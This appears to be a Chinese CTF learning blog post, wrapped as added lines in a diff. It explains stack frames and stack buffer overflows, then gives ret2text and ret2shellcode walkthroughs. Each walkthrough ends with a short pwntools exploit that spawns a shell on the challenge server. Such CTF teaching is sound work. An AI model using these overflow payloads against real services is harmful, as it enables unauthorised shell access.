@@ -1,0 +1,575 @@
+
+
+
+
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta name="referrer" content="no-referrer"/>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#FFF">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+
+<link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+<link rel="alternate" type="application/rss+xml" title="golden的部落阁" href="http://blog.g01den.top/rss.xml" />
+<link rel="alternate" type="application/atom+xml" title="golden的部落阁" href="http://blog.g01den.top/atom.xml" />
+<link rel="alternate" type="application/json" title="golden的部落阁" href="http://blog.g01den.top/feed.json" />
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="/css/app.css?v=0.2.5">
+
+  
+  <meta name="keywords" content="Pwn" />
+
+
+<link rel="canonical" href="http://blog.g01den.top/posts/c3c1bd42.html">
+
+
+
+  <title>
+Pwn学习笔记（2）--ret_2_text_or_shellcode - Pwn手的自我修养 |
+golden的部落阁 = golden的部落阁 = subtitle写得真好</title>
+<meta name="generator" content="Hexo 7.2.0"></head>
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div id="loading">
+    <div class="cat">
+      <div class="body"></div>
+      <div class="head">
+        <div class="face"></div>
+      </div>
+      <div class="foot">
+        <div class="tummy-end"></div>
+        <div class="bottom"></div>
+        <div class="legs left"></div>
+        <div class="legs right"></div>
+      </div>
+      <div class="paw">
+        <div class="hands left"></div>
+        <div class="hands right"></div>
+      </div>
+    </div>
+  </div>
+  <div id="container">
+    <header id="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="inner">
+        <div id="brand">
+          <div class="pjax">
+          
+  <h1 itemprop="name headline">Pwn学习笔记（2）--ret_2_text_or_shellcode
+  </h1>
+  
+<div class="meta">
+  <span class="item" title="创建时间：2024-02-04 18:10:34">
+    <span class="icon">
+      <i class="ic i-calendar"></i>
+    </span>
+    <span class="text">发表于</span>
+    <time itemprop="dateCreated datePublished" datetime="2024-02-04T18:10:34+08:00">2024-02-04</time>
+  </span>
+</div>
+
+
+          </div>
+        </div>
+        <nav id="nav">
+  <div class="inner">
+    <div class="toggle">
+      <div class="lines" aria-label="切换导航栏">
+        <span class="line"></span>
+        <span class="line"></span>
+        <span class="line"></span>
+      </div>
+    </div>
+    <ul class="menu">
+      <li class="item title"><a href="/" rel="start">golden的部落阁</a></li>
+    </ul>
+    <ul class="right">
+      <li class="item theme">
+        <i class="ic i-sun"></i>
+      </li>
+      <li class="item search">
+        <i class="ic i-search"></i>
+      </li>
+    </ul>
+  </div>
+</nav>
+
+      </div>
+      <div id="imgs" class="pjax">
+          <img src="https://gitee.com/gou-dengyue/images/raw/master/picture107.jpg">
+      </div>
+    </header>
+    <div id="waves">
+      <svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto">
+        <defs>
+          <path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z" />
+        </defs>
+        <g class="parallax">
+          <use xlink:href="#gentle-wave" x="48" y="0" />
+          <use xlink:href="#gentle-wave" x="48" y="3" />
+          <use xlink:href="#gentle-wave" x="48" y="5" />
+          <use xlink:href="#gentle-wave" x="48" y="7" />
+        </g>
+      </svg>
+    </div>
+    <main>
+      <div class="inner">
+        <div id="main" class="pjax">
+          
+  <div class="article wrap">
+    
+<div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList">
+<i class="ic i-home"></i>
+<span><a href="/">首页</a></span><i class="ic i-angle-right"></i>
+<span  class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/Pwn/" itemprop="item" rel="index" title="分类于 Pwn手的自我修养"><span itemprop="name">Pwn手的自我修养</span></a>
+<meta itemprop="position" content="1" /></span>
+</div>
+
+    <article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN">
+  <link itemprop="mainEntityOfPage" href="http://blog.g01den.top/posts/c3c1bd42.html">
+
+  <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <meta itemprop="image" content="/images/avatar.jpg">
+    <meta itemprop="name" content="g01den">
+    <meta itemprop="description" content="subtitle写得真好, golden的部落阁">
+  </span>
+
+  <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+    <meta itemprop="name" content="golden的部落阁">
+  </span>
+
+  <div class="body md" itemprop="articleBody">
+    
+
+    <h1 id="pwn学习笔记2"><a class="markdownIt-Anchor" href="#pwn学习笔记2">#</a> pwn 学习笔记（2）</h1>
+<h2 id="1三种常见的寄存器"><a class="markdownIt-Anchor" href="#1三种常见的寄存器">#</a> 1. 三种常见的寄存器：</h2>
+<p>​	ax 寄存器：通用寄存器，可用于存放多种数据</p>
+<p>​	bp 寄存器：存放的是栈帧的栈底地址</p>
+<p>​	sp 寄存器：存放的是栈顶的地址</p>
+<h2 id="2栈帧与栈工作的简介"><a class="markdownIt-Anchor" href="#2栈帧与栈工作的简介">#</a> 2. 栈帧与栈工作的简介：</h2>
+<p>​		栈帧是存储函数的一些信息的地方，栈帧存储有函数的局部变量，传递给子函数的实际参数，父函数的地址以及上一个栈帧栈底的地址，大致情况如下：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/fb7f5e074f454da6b1459fd822dc9036.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	在函数调用的过程中，首先会讲 bp 寄存器的值进行压栈，以方便在恢复的时候恢复栈底寄存器的值，再之后，会按顺序将局部变量压栈，最后是子函数的实际参数，会按照先入栈的后出栈，从最后一个实际参数先入栈再到第一个实际参数，比如函数 a (int a , int b)，压栈的方式就是先压栈 b 的实际参数，再压栈 a 的实际参数，当这些压栈完成之后，就可以压栈父函数调用子函数的那条语句的下一条语句的地址，紧接着，可以压栈当前栈帧的栈底地址了。</p>
+<p>​	具体的汇编语言实现就不多做解释了，因为我这里只是简述。</p>
+<h2 id="3缓冲区溢出漏洞"><a class="markdownIt-Anchor" href="#3缓冲区溢出漏洞">#</a> 3. 缓冲区溢出漏洞：</h2>
+<p>​	缓冲区溢出楼哦对那个的本质就是向定长的缓冲区中写入了超长的数据，造成了写入的数据覆盖了其他合法的内存区域。</p>
+<h2 id="4栈溢出之ret2text"><a class="markdownIt-Anchor" href="#4栈溢出之ret2text">#</a> 4. 栈溢出之–ret2text：</h2>
+<h3 id="1原理"><a class="markdownIt-Anchor" href="#1原理">#</a> （1）原理：</h3>
+<p>​	ret2text 应该是最简单的栈溢出漏洞利用的方式也是最简单的：</p>
+<p>​	假设，在栈中，存在如下情况：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/ee2c57b57c254a6fb3f6f4edb0e9391b.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​</p>
+<p>其 C 程序源代码如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">overflow</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">char</span> buf[<span class="number">8</span>];</span><br><span class="line">    gets(buf);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>当程序运行到 gets 的时候，因为 gets 没有对用户输入的内容的长度进行限制，就导致了本来最多输入 8 字节的内容，结果输入了超过 8 字节的内容导致了溢出，覆盖掉了 bp 寄存器以及返回地址的值，如下：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/46531ac3516e437caee9cd80941f185d.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	之后，可以通过如上的原理，将返回地址的值修改为程序自带的后门函数（如 system (&quot;/bin/sh&quot;)）中即可。</p>
+<h3 id="2题目示例nssctf-2022-spring-recruitr3m4ke"><a class="markdownIt-Anchor" href="#2题目示例nssctf-2022-spring-recruitr3m4ke">#</a> （2）题目示例–[NSSCTF 2022 Spring Recruit] R3m4ke?：</h3>
+<p>​	拿到 ELF 文件之后第一步应该先检查相关的保护，因为保护这里还没有讲，所以这里拿到的是一个只开了 NX 保护的题目，该保护对这道题几乎没有什么影响。</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/7def99ff9bb140a2a03df9b1a04444cf.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	这里可以看出，这个文件是一个 64 位的小端序文件，所以这里使用 IDA 进行反编译：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/9ac23fd3d87546dcb03b398658d926b9.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	这里可以很直观的发现，该函数声明了一个 32 字节的变量，之后通过 gets () 函数来写入内容，但是却没有对长度进行相关的限制，因此存在溢出漏洞，这个时候就只需要找到后门函数的地址即可，之后通过 Sheft+F12，找到 /bin/sh 这个字符串，然后跟进，发现它存在于一个叫做 LookAtMe () 这个函数中，这里，也可以直接从函数视图中找到后门：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/2a634e35ccb943d381dd3777ceb0fc56.png#pic_center" alt="在这里插入图片描述"></p>
+<p>​	这里可以找到后门函数的地址，及 0x40072C，因此，这里就可以编写 exp，如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node4.anna.nssctf.cn&quot;</span>,<span class="number">28043</span>)</span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span> + p64(<span class="number">0x40072C</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>​	运行代码之后成功拿到了目标主机的 shell：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/2c80dc47052b4c0b99da4499f6cf23e2.png#pic_center" alt="在这里插入图片描述"></p>
+<h2 id="5栈溢出之ret2shellcode"><a class="markdownIt-Anchor" href="#5栈溢出之ret2shellcode">#</a> 5. 栈溢出之–ret2shellcode：</h2>
+<h3 id="1原理-2"><a class="markdownIt-Anchor" href="#1原理-2">#</a> （1）原理：</h3>
+<p>​	该方法原理与 ret2shellcode 类似，只是，原本存在的后门没有了，但是给了足够的可写入的地方于用户写入 shellcode 代码，这里前期存在两种方法写入 shellcode，第一种是写入 Stack 中，第二种是写入 bss 段，准确地说，必须当一个段中存在可写可执行的权限时才能进行 ret2shellcode。</p>
+<p>​	步骤大致是，首先修改下一些配置信息，比如 context.arch，当程序时 64 位时，应该讲此修改为 amd64；之后，让 python 程序自动生成一个 shellcode 或者去相应的地方找，python 的相关代码是：shellcraft [.amd64].sh ()；之后通过 asm () 函数将生成的 shllcode 编译成机器码；然后就是发送相关的垃圾数据之类的进行后续操作。</p>
+<h3 id="2题目案例hnctf-2022-week1ret2shellcode"><a class="markdownIt-Anchor" href="#2题目案例hnctf-2022-week1ret2shellcode">#</a> （2）题目案例–[HNCTF 2022 Week1] ret2shellcode</h3>
+<p>​	先查看它的保护类型：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/c1a04d4871a6468a9009b2ab3e122848.png#pic_center" alt="在这里插入图片描述"></p>
+<p>发现跟上一个一致，这里可以简单说下 NX 保护，NX 保护是栈不可执行，开启了这个保护之后，在栈上写入的 shellcode 将不会因为我们修改的 return address 的值而执行，因此，我们可以把目标放到 bss 段上，不过，首先还是得确保 bss 段是否存在可执行权限。</p>
+<p>​	对于这道题，首先应该反编译，得到伪代码：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/bae3083c571a4f3ca431d421ec703486.png#pic_center" alt="在这里插入图片描述"></p>
+<p>我们可以发现，在 main 函数中，这里并没有生命 buff 变量， 但是这里却可以直接使用，说明 buff 是在全局变量中进行的声明，因此这里跟进这个变量，发现其在 bss 段中：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/b596d670671f4ecf843459c14d1a037c.png#pic_center" alt="在这里插入图片描述"></p>
+<p>另外，通过 pwndbg 的 vmmap 命令可以知道这段内存存在可执行的权限：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/2b6bc44c1d3448dcbf4a298ef01afe7a.png#pic_center" alt="在这里插入图片描述"></p>
+<p>因此，这个题目的思路就很明了了，首先是程序的分析，通过写入字符串给 s，然后将 s 的内容复制给 buff，限制的 s 的写入长度长于 256 字节，因此存在缓冲区溢出漏洞，这里就很明了了，代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">&quot;node5.anna.nssctf.cn&quot;</span>,<span class="number">28172</span>)</span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">shellcode = asm(shellcraft.amd64.sh())</span><br><span class="line">buff = <span class="number">0x4040A0</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">0x108</span>,<span class="string">b&#x27;A&#x27;</span>) + p64(buff)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+<p>最后成功拿到目标 shell：</p>
+<p><img data-src="https://img-blog.csdnimg.cn/direct/52851acf64c0452f9dcff98caec859a4.png#pic_center" alt="在这里插入图片描述"></p>
+
+      <div class="tags">
+          <a href="/tags/Pwn/" rel="tag"><i class="ic i-tag"></i> Pwn</a>
+      </div>
+  </div>
+
+   <footer>
+
+    <div class="meta">
+  <span class="item">
+    <span class="icon">
+      <i class="ic i-calendar-check"></i>
+    </span>
+    <span class="text">更新于</span>
+    <time title="修改时间：2024-06-20 21:28:17" itemprop="dateModified" datetime="2024-06-20T21:28:17+08:00">2024-06-20</time>
+  </span>
+</div>
+
+      
+<div class="reward">
+  <button><i class="ic i-heartbeat"></i> 赞赏</button>
+  <p>请我喝[茶]~(￣▽￣)~*</p>
+  <div id="qr">
+      
+      <div>
+        <img data-src="/images/wechatpay.png" alt="g01den 微信支付">
+        <p>微信支付</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/alipay.png" alt="g01den 支付宝">
+        <p>支付宝</p>
+      </div>
+      
+      <div>
+        <img data-src="/images/paypal.png" alt="g01den 贝宝">
+        <p>贝宝</p>
+      </div>
+  </div>
+</div>
+
+      
+
+<div id="copyright">
+<ul>
+  <li class="author">
+    <strong>本文作者： </strong>g01den <i class="ic i-at"><em>@</em></i>golden的部落阁
+  </li>
+  <li class="link">
+    <strong>本文链接：</strong>
+    <a href="http://blog.g01den.top/posts/c3c1bd42.html" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">http://blog.g01den.top/posts/c3c1bd42.html</a>
+  </li>
+  <li class="license">
+    <strong>版权声明： </strong>本站所有文章除特别声明外，均采用 <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC96aC1DTg=="><i class="ic i-creative-commons"><em>(CC)</em></i>BY-NC-SA</span> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+  </footer>
+
+</article>
+
+  </div>
+  
+
+<div class="post-nav">
+    <div class="item left">
+      
+
+  <a href="/posts/c06afb6e.html" itemprop="url" rel="prev" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture66.jpg" title="Pwn学习笔记（1）--前置知识">
+  <span class="type">上一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>Pwn学习笔记（1）--前置知识</h3>
+  </a>
+
+    </div>
+    <div class="item right">
+      
+
+  <a href="/posts/e20e7502.html" itemprop="url" rel="next" data-background-image="https:&#x2F;&#x2F;gitee.com&#x2F;gou-dengyue&#x2F;images&#x2F;raw&#x2F;master&#x2F;picture108.jpg" title="pwn学习笔记（3）ret2syscall">
+  <span class="type">下一篇</span>
+  <span class="category"><i class="ic i-flag"></i> Pwn手的自我修养</span>
+  <h3>pwn学习笔记（3）ret2syscall</h3>
+  </a>
+
+    </div>
+</div>
+
+  
+  <div class="wrap" id="comments"></div>
+
+
+        </div>
+        <div id="sidebar">
+          
+
+<div class="inner">
+
+  <div class="panels">
+    <div class="inner">
+      <div class="contents panel pjax" data-title="文章目录">
+          <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pwn%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B02"><span class="toc-number">1.</span> <span class="toc-text"> pwn 学习笔记（2）</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1%E4%B8%89%E7%A7%8D%E5%B8%B8%E8%A7%81%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8"><span class="toc-number">1.1.</span> <span class="toc-text"> 1. 三种常见的寄存器：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2%E6%A0%88%E5%B8%A7%E4%B8%8E%E6%A0%88%E5%B7%A5%E4%BD%9C%E7%9A%84%E7%AE%80%E4%BB%8B"><span class="toc-number">1.2.</span> <span class="toc-text"> 2. 栈帧与栈工作的简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.3.</span> <span class="toc-text"> 3. 缓冲区溢出漏洞：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2text"><span class="toc-number">1.4.</span> <span class="toc-text"> 4. 栈溢出之–ret2text：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.1.</span> <span class="toc-text"> （1）原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E9%A2%98%E7%9B%AE%E7%A4%BA%E4%BE%8Bnssctf-2022-spring-recruitr3m4ke"><span class="toc-number">1.4.2.</span> <span class="toc-text"> （2）题目示例–[NSSCTF 2022 Spring Recruit] R3m4ke?：</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#5%E6%A0%88%E6%BA%A2%E5%87%BA%E4%B9%8Bret2shellcode"><span class="toc-number">1.5.</span> <span class="toc-text"> 5. 栈溢出之–ret2shellcode：</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E5%8E%9F%E7%90%86-2"><span class="toc-number">1.5.1.</span> <span class="toc-text"> （1）原理：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2%E9%A2%98%E7%9B%AE%E6%A1%88%E4%BE%8Bhnctf-2022-week1ret2shellcode"><span class="toc-number">1.5.2.</span> <span class="toc-text"> （2）题目案例–[HNCTF 2022 Week1] ret2shellcode</span></a></li></ol></li></ol></li></ol>
+      </div>
+      <div class="related panel pjax" data-title="系列文章">
+        <ul>
+          <li><a href="/posts/c06afb6e.html" rel="bookmark" title="Pwn学习笔记（1）--前置知识">Pwn学习笔记（1）--前置知识</a></li><li class="active"><a href="/posts/c3c1bd42.html" rel="bookmark" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></li><li><a href="/posts/e20e7502.html" rel="bookmark" title="pwn学习笔记（3）ret2syscall">pwn学习笔记（3）ret2syscall</a></li><li><a href="/posts/52965aaa.html" rel="bookmark" title="pwn学习笔记（4）ret2libc">pwn学习笔记（4）ret2libc</a></li><li><a href="/posts/a698ff8.html" rel="bookmark" title="pwn学习笔记（5）--格式化字符串漏洞（未完全完成）">pwn学习笔记（5）--格式化字符串漏洞（未完全完成）</a></li><li><a href="/posts/cbafa55d.html" rel="bookmark" title="pwn学习笔记（6）--堆基础概述">pwn学习笔记（6）--堆基础概述</a></li><li><a href="/posts/efb4c08.html" rel="bookmark" title="pwn学习笔记（7）--堆相关源码">pwn学习笔记（7）--堆相关源码</a></li><li><a href="/posts/d7e2e20f.html" rel="bookmark" title="pwn学习笔记（0）-事后补充">pwn学习笔记（0）-事后补充</a></li><li><a href="/posts/9b0d93f7.html" rel="bookmark" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></li><li><a href="/posts/2c0210e1.html" rel="bookmark" title="how2heap_zh">how2heap_zh</a></li><li><a href="/posts/9d5b1ce4.html" rel="bookmark" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></li><li><a href="/posts/c8624158.html" rel="bookmark" title="pwn学习笔记（9）-中级ROP--ret2csu">pwn学习笔记（9）-中级ROP--ret2csu</a></li><li><a href="/posts/540e5c20.html" rel="bookmark" title="Pwn学习笔记（10）--UAF">Pwn学习笔记（10）--UAF</a></li><li><a href="/posts/f1497b96.html" rel="bookmark" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></li><li><a href="/posts/d1a08bca.html" rel="bookmark" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></li>
+        </ul>
+      </div>
+      <div class="overview panel" data-title="站点概览">
+        <div class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <img class="image" itemprop="image" alt="g01den"
+      data-src="/images/avatar.jpg">
+  <p class="name" itemprop="name">g01den</p>
+  <div class="description" itemprop="description">golden的部落阁</div>
+</div>
+
+<nav class="state">
+    <div class="item posts">
+      <a href="/archives/">
+        <span class="count">49</span>
+        <span class="name">文章</span>
+      </a>
+    </div>
+    <div class="item categories">
+      <a href="/categories/">
+        <span class="count">10</span>
+        <span class="name">分类</span>
+      </a>
+    </div>
+    <div class="item tags">
+      <a href="/tags/">
+        <span class="count">8</span>
+        <span class="name">标签</span>
+      </a>
+    </div>
+</nav>
+
+<div class="social">
+      <span class="exturl item github" data-url="aHR0cHM6Ly9naXRodWIuY29tL2cwMWRlbjE=" title="https:&#x2F;&#x2F;github.com&#x2F;g01den1"><i class="ic i-github"></i></span>
+</div>
+
+<ul class="menu">
+  
+    
+  <li class="item">
+    <a href="/" rel="section"><i class="ic i-home"></i>首页</a>
+  </li>
+
+    
+  <li class="item">
+    <a href="/about/" rel="section"><i class="ic i-user"></i>关于</a>
+  </li>
+
+        
+  <li class="item dropdown">
+      <a href="javascript:void(0);"><i class="ic i-feather"></i>文章</a>
+    <ul class="submenu">
+
+        
+  <li class="item">
+    <a href="/archives/" rel="section"><i class="ic i-list-alt"></i>归档</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/categories/" rel="section"><i class="ic i-th"></i>分类</a>
+  </li>
+
+        
+  <li class="item">
+    <a href="/tags/" rel="section"><i class="ic i-tags"></i>标签</a>
+  </li>
+
+  </ul>
+    
+  <li class="item">
+    <a href="/links/" rel="section"><i class="ic i-magic"></i>links</a>
+  </li>
+
+
+</ul>
+
+      </div>
+    </div>
+  </div>
+
+  <ul id="quick">
+    <li class="prev pjax">
+        <a href="/posts/c06afb6e.html" rel="prev" title="上一篇"><i class="ic i-chevron-left"></i></a>
+    </li>
+    <li class="up"><i class="ic i-arrow-up"></i></li>
+    <li class="down"><i class="ic i-arrow-down"></i></li>
+    <li class="next pjax">
+        <a href="/posts/e20e7502.html" rel="next" title="下一篇"><i class="ic i-chevron-right"></i></a>
+    </li>
+    <li class="percent"></li>
+  </ul>
+</div>
+
+
+        </div>
+        <div class="dimmer"></div>
+      </div>
+    </main>
+    <footer id="footer">
+      <div class="inner">
+        <div class="widgets">
+          
+<div class="rpost pjax">
+  <h2>随机文章</h2>
+  <ul>
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/d1a08bca.html" title="pwn学习笔记（12）--Chunk Extend and Overlapping">pwn学习笔记（12）--Chunk Extend and Overlapping</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/9d5b1ce4.html" title="pwn学习笔记（8）-初识沙箱">pwn学习笔记（8）-初识沙箱</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/9b0d93f7.html" title="Pwn刷题记录（不停更新）">Pwn刷题记录（不停更新）</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/c3c1bd42.html" title="Pwn学习笔记（2）--ret_2_text_or_shellcode">Pwn学习笔记（2）--ret_2_text_or_shellcode</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/e3418ca3.html" title="随机二次元图api相关">随机二次元图api相关</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Game/" title="分类于 CTFer的比赛之路">CTFer的比赛之路</a>
+</div>
+
+    <span><a href="/posts/c2860616.html" title="网鼎杯2024青龙组官方资格赛wp">网鼎杯2024青龙组官方资格赛wp</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Pwn/" title="分类于 Pwn手的自我修养">Pwn手的自我修养</a>
+</div>
+
+    <span><a href="/posts/f1497b96.html" title="pwn学习笔记（11）--off_by_one">pwn学习笔记（11）--off_by_one</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Java/" title="分类于 Java从入门到入狱">Java从入门到入狱</a>
+</div>
+
+    <span><a href="/posts/3fe30769.html" title="一、Servlet和JSP技术概述">一、Servlet和JSP技术概述</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Web/" title="分类于 Web狗的自我安慰">Web狗的自我安慰</a>
+</div>
+
+    <span><a href="/posts/2f610211.html" title="反弹shell">反弹shell</a></span>
+  </li>
+
+      
+  <li class="item">
+    
+<div class="breadcrumb">
+<a href="/categories/Daily/" title="分类于 发电日常">发电日常</a>
+</div>
+
+    <span><a href="/posts/7232a36b.html" title="小小的总结（日常发癫）">小小的总结（日常发癫）</a></span>
+  </li>
+
+  </ul>
+</div>
+<div>
+  <h2>最新评论</h2>
+  <ul class="leancloud-recent-comment"></ul>
+</div>
+
+        </div>
+        <div class="status">
+  <div class="copyright">
+    
+    &copy; 2010 – 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="ic i-sakura rotate"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">g01den @ golden的部落阁</span>
+  </div>
+  <div class="powered-by">
+    基于 <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & Theme.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FtZWhpbWUvaGV4by10aGVtZS1zaG9rYQ==">Shoka</span>
+     <p><a target="_blank" rel="noopener" href="https://beian.miit.gov.cn">蜀ICP备2024083302号</a><!--|<a target="_blank" rel="noopener" href="https://beian.mps.gov.cn/#/query/webSearch">公网安备XXXXXXXX号</a> -->
+  </div>
+</div>
+
+      </div>
+    </footer>
+  </div>
+<script data-config type="text/javascript">
+  var LOCAL = {
+    path: 'posts/c3c1bd42.html',
+    favicon: {
+      show: "（●´3｀●）やれやれだぜ",
+      hide: "(´Д｀)大変だ！"
+    },
+    search : {
+      placeholder: "文章搜索",
+      empty: "关于 「 ${query} 」，什么也没搜到",
+      stats: "${time} ms 内找到 ${hits} 条结果"
+    },
+    valine: true,fancybox: true,
+    copyright: '复制成功，转载请遵守 <i class="ic i-creative-commons"></i>BY-NC-SA 协议。',
+    ignores : [
+      function(uri) {
+        return uri.includes('#');
+      },
+      function(uri) {
+        return new RegExp(LOCAL.path+"$").test(uri);
+      }
+    ]
+  };
+</script>
+
+<script src="https://cdn.polyfill.io/v2/polyfill.js"></script>
+
+<script src="//fastly.jsdelivr.net/combine/npm/pace-js@1.0.2/pace.min.js,npm/pjax@0.2.8/pjax.min.js,npm/whatwg-fetch@3.4.0/dist/fetch.umd.min.js,npm/animejs@3.2.0/lib/anime.min.js,npm/algoliasearch@4/dist/algoliasearch-lite.umd.js,npm/instantsearch.js@4/dist/instantsearch.production.min.js,npm/lozad@1/dist/lozad.min.js,npm/quicklink@2/dist/quicklink.umd.js"></script>
+
+<script src="/js/app.js?v=0.2.5"></script>
+
+
+
+
